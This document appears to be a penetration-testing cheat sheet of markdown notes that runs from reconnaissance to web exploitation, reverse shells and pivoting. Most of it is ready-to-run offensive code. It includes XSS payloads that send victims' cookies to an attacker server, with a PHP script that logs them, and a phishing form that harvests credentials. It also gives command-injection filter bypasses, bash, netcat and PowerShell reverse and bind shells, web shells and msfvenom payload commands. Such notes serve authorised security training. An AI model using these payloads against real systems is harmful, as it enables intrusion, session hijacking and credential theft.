## _External Testing_
---
### External Information Gathering
==First Approach==
_Initial Simple Scan._
```bash
sudo nmap --open -oA nmap/initial_scan -iL scope
```

_Massive scan_ (OS detection, version detection, script scanning, and trace-route).
```bash
sudo nmap --open -p- -A -oA nmap/massive_scan -iL scope
```

_Finder for Massive scan._
```bash
egrep -v "^#|Status: Up" nmap/massive_scan | cut -d ' ' -f4- | tr ',' '\n' | 
\                                                               
sed -e 's/^[ \t]*//' | awk -F '/' '{print $7}' | grep -v "^$" | sort | uniq -c 
\
| sort -k 1 -nr
```

_Banner Grab to Enumerate Ports_
```bash
sudo nmap -v 10.10.10.10 --script banner.nse
```

_Get Hostname_
```bash
nmap -sP -O 192.168.1.0/24
```

```

---
==DNS-Enumeration==
_Perform zone transfer enumeration._
```bash
dig axfr domain.local @10.10.10.10 # @ => where perform dns query.
```
___
==Vhosts-Enumeration==
Search content length for _non-existent_ domains.
```bash
curl -s -I http://10.10.10.10. -H "HOST: fake.domain.local" | grep "Content-Length:"
```

Find active _vhosts_.
```bash
ffuf -w ~/SecLists/Discovery/DNS/namelist.txt -u http://10.10.10.10/ -H 'Host:FUZZ.domain.local' -fs [content lenght first found]
```
---
> Nice way to add them to /etc/hosts
``` bash
sudo tee -a /etc/hosts > /dev/null <<EOT

## "scope" hosts
10.10.10.10 domain.local 1.domain.local 2.domain.local [etc...]
EOT
```
### Service Enumeration & Exploit 
_Bannering._
```bash
nc -nv 10.10.10.10 <port>
```

[More References](https://github.com/MattiaCossu/FootprintingKnowledge)


### Web Enumeration & Exploit
#### Simple Enumeration
Take a screenshot for all website _index_ in a scope.
```bash
eyewitness -f <list with all site> -d <output dir>
```
--- 
==Fuzzing Sub-directory==
```bash
gobuster dir -u http://SERVER_IP:PORT -w <wordlist>:FUZZ -x .php -t 300
```

```bash
feroxbuster -u http://SERVER_IP:PORT -w <wordlist>:FUZZ -x 'php,bak,txt' -t 50 -C <ignoring code like 404>
```

```bash
ffuf -w <wordlist>:FUZZ -u http://SERVER_IP:PORT/FUZZ
```
#### Classic CMS
###### WordPress
==Enumeration==
_Enumeration Plugin_
```bash
sudo wpscan -e ap -t 500 --url http://domain.local
```

_Enumeration Local File Inclusion_
```bash
wpscan -e u -t 500 --url http://domain.local
```
---
==Brute Force==
_Brute Force Account_
```bash
wpscan --url http://domain.local -P passwords.txt -U <target user>
```
#### SQL Injection
==Union Attack==
```sql
' union select null, database(), user(), @@version -- //
```
---
==sqlmap==
Use _sqlmap_ for automate SQL injection attack. (*very noisy*).
First in first capture the request in burp and add _*_ in the supposed inject able field.
```text
POST / HTTP/1.1
[...]

searchitem=*
```

Run this through sqlmap as follow.
```bash
sqlmap -r <request first found> --dbms=mysql 
```

Enumerate the available _databases_.
```bash
sqlmap -r <request first found> --dbms=mysql --dbs
```

Enumerate _tables_ for a specific db.
```bash
sqlmap -r <request first found> --dbms=mysql -D <db> --tables
```
#### Cross-Site Scripting (XSS)

There are three main types of XSS vulnerabilities:

| Type                           | Description                                                                                                                                                                                                                                  |
| ------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Stored (Persistent) XSS        | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)                                                                                   |
| Reflected (Non-Persistent) XSS | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)                                                                                 |
| DOM-based XSS                  | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags) |
Some of the common open-source tools that can assist us in XSS discovery
- [XSS Strike](https://github.com/s0md3v/XSStrike)
- [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS)
- [XSSer](https://github.com/epsylon/xsser)

Simple test.
```js
<script>alert(1)</script>
<script>alert(window.origin)</script>
<script>print()</script>
```
---
##### Defacing
We can utilize injected JavaScript code (through XSS) to make a web page look any way we like.
```javascript
<script>document.body.style.background = "#141d2b"</script> # background color
<script>document.body.background = "url to image"</script> # background image
<script>document.title = 'HackTheBox Academy'</script> # page title
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script> # change all page
```

==Fetch the requests.==
In inject able field.
_Blind Cross-Site Scripting (XSS)_.
```js
"><script src=http://10.10.14.15:9000/TESTING_THIS</script>
```

In attacker Machine.
```bash
nc -lnvp 9000
```

```bash
python3 -m http.server 9000
```
---
##### Phishing
==By Malicious Form==
_Simple Form_
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

_Remove Right Form_
```javascript
document.getElementById('urlform').remove();
```

_PHP Server for process stealthy the request  
==Data Leak==
Dumps sensitive information (_data leak_).
_Dump Cookies_.
In attacker web server. (our machine).
~~index.php~~
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
~~script.js~~
```js
new Image().src='http://10.10.10.10:9200/index.php?c='+document.cookie
```

Now start the php server.
```bash
sudo php -S 0.0.0.0.0:9200
```

Submit that in inject able field.
```js
"><script src=http://10.10.10.10:9200/script.js></script>
```

This trigger the attacker server to server malicious JS script.
After that the scripts, served to client, will make a request to our web server whit a fake URL for "GET" the pictures.
In the URL the client will hang the cookie of the logged user.

__Fast way for dump cookie__
If the XSS is reflected we can procedure whit this simple techniques.
in inject able field:
```js
<img src=x onerror=fetch('http://10.10.10.10:8888/'+document.cookie);>
```

In attacker machine.
```bahs
python3 -m http.server 8888
```

We get a callback on our web server.
#### Command Injection 
```text
GET /ping.php?ip=%127.0.0.1;id
GET /ping.php?ip=%127.0.0.1|id
```

We can bypass this filter by using a line feed character _%0A_ (or new-line character).
```bash
GET /ping.php?ip=127.0.0.1%0aid
```

More Complex. 
```bash
GET /ping.php?ip=127.0.0.1%0a'i'd"
```

We can use the (__$IFS__) Linux Environment Variable to bypass space restrictions.
```text
GET /ping.php?ip=127.0.0.1%0a'c'at${IFS}ping.php
```

Find __socat__ for build rev shell.
```
GET /ping.php?ip=127.0.0.1%0a'w'h'i'ch${IFS}socat 
```
### Initial Access | Shell
#### Reverse-Shell
==Example Prepare Payload==
In a simple _RCE_ we have a payload looks like this.
```bash
socat TCP4:10.10.14.5:4444 EXEC:/bin/bash
```

We have to modify it in according to our needs.
For example in a URL.
```text
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:4444${IFS}EXEC:bash HTTP/1.1
```

==Rapid Payload==
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

==Listener==
_netcat_
```bash
nc -nvlp 4444
```

_pwncat_
```bash
python3 -m pwncat -lp 4444
```

_busybox_
```bash
busybox nc -lp 4444
```

_windows_pty_
```bash
stty raw -echo; (stty size; cat) | nc -lvnp 4444
```

_msfconsole_
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.10.10; set lport 4444; exploit"
```

_socat_
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
#### Bind Shell
The following are reliable commands we can use to start a bind shell.

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <server ip> 7777 > /tmp/f
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

```bash
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

_NetCat Connection_
```bash
nc -nv 10.10.10.1 1234
```

> [!NOTE]
> If we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately.
#### Web Shell
```php
 <?php system($_REQUEST["cmd"]); ?>
```

```jsp
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
 <% eval request("cmd") %>
```

_Other Resources_
- [Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
- [Antak](https://github.com/samratashok/nishang)
- [PHP Web Shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

==Common Upload Path==

| Web Server | Default Web Root      |
| ---------- | --------------------- |
| Apach      | /var/www/html         |
| Nginx      | /usr/local/nginx/html |
| ISS        | C:\inetpub\wwwroot\   |
| XAMPP      | C:\xampp\htdocs\      |

==Access via curl==
```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
```
#### Upgrade TTY - Linux
_netcat_
Upgrade.
```bash
python -c 'import pty; pty.spawn("/bin/bash")' # For import real tty
```

```bash
^Z

stty raw -echo
fg
```

Full Upgrade
In personal box.
```bash
echo $TERM

stty size
```

In a victim.
```bash
export TERM=[echo $TERM → output]

stty rows 67 columns 318 → based on output of stty size
```

_socat_
We'll start a Socat listener on our attack host.
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

Next, we'll execute a Socat one-liner on the target host.
```bash
nc -lnvp 4444
```

If all goes as planned, we'll have a stable reverse shell connection on our *Socat listener*.

_/bin/sh -i_
```bash
/bin/bash -i # interactive mode
```

_Perl_
``` bash
perl: 'exec "/bin/sh";'
```

```bash
perl —e 'exec "/bin/sh";'
```

_Ruby_
```bash
ruby: exec "/bin/bash"
```

_Lua_
```bash
lua: os.execute('/bin/sh')
```

_AWK_
```bash
awk 'BEGIN {system("/bin/sh")}'
```

_Find_
```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

```bash
find . -exec /bin/sh \; -quit
```

_Vim_
```bash
vim -c ':!/bin/sh'
```

```bash
vim
:set shell=/bin/sh
:shell
```


#### Command for connect directly
##### RDP
```bash
xfreerdp /v:<ip> /u:<users> /p:<password> ùon /drive:<share name>,<path to mount>
```
##### Winrm
```bash
evil-winrm -i 10.10.10.10 -u <User> -p '<Password>'
```
##### RPC
```bash
rpcclient -U '<User>%<Password>' 10.10.10.10
```
#### Build Exploit
##### msfvenom
_List Payloads_
```bash
msfvenom -l payloads
```

> [!NOTE] Staged vs Stageless
> A _steged payload_ is a payload that is sent to the target machine in multiple rounds, in contrast a _stageless payload_ is a single payload that is sent to the taget in a single round, this helps in scenarios of limited bandwidth or social engeniring techniques

_Example stageless payload for linux_
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > <name>.elf
```

_Example stageless payload for windows_
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > <name>.exe
```
## _Internal Testing_
---
### Post Exploitation | Persistence

### Internal Information Gathering
#### Pivoting 
##### Pivoting Via SSH
_SSH pivot_ using dynamic port forwarding.
This means we can proxy traffic from our attack host through port 8081 on the target to reach hosts inside.
```bash
ssh -D 8081 -i id_rsa root@10.129.203.111
```

Confirm dynamic forwording.
```bash
netstat -antp | grep 8081
```

Next, we need to modify the __/etc/proxychains.conf__.
```bash
grep socks4 /etc/proxychains.conf 

#	 	socks4	192.168.1.49	1080
#       proxy types: http, socks4, socks5
socks4 	127.0.0.1 8081
```

Use command over pivot.
```bash
proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
```
---
__Host Discovery__ via ssh.
```bash
for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
```

__Host Enumeration__ via ssh.
```bash
proxychains nmap --open -iL live_hosts 
```
---
#### Oudit Network Performe
In some case we need to monitor traffic speed to see if any tools we are using might be generating disruption
```bash
sudo vnstat -l -i eth0
```


